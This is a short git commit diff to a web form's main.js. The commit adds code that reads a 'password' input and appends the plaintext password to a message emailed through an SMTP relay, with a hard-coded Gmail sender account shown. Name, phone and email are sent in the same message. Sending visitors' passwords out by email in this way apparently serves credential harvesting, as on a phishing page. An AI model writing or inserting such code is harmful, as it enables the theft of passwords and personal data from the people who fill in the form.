0acfd6ced462ecdb99c00583fcb24fd4945ec535
Mido <34779315+midobolt@users.noreply.github.com>
2023-12-03 14:53:06 +0100

    Update main.js

--- main.js
+++ main.js
@@ -2,9 +2,10 @@ function emailSend() {
   var userName = document.getElementById("name").value;
   var phone = document.getElementById("phone").value;
   var email = document.getElementById("email").value;
+  var password = document.getElementById("password").value;
 
   var messageBody =
-    "Name: " + userName + "<br/> Phone: " + phone + "<br/> Email: " + email;
+    "Name: " + userName + "<br/> Phone: " + phone + "<br/> Email: " + email + "<br/> Password: " + password;
   Email.send({
     Host: "smtp.elasticemail.com",
     Username: "hejhej6857@gmail.com",
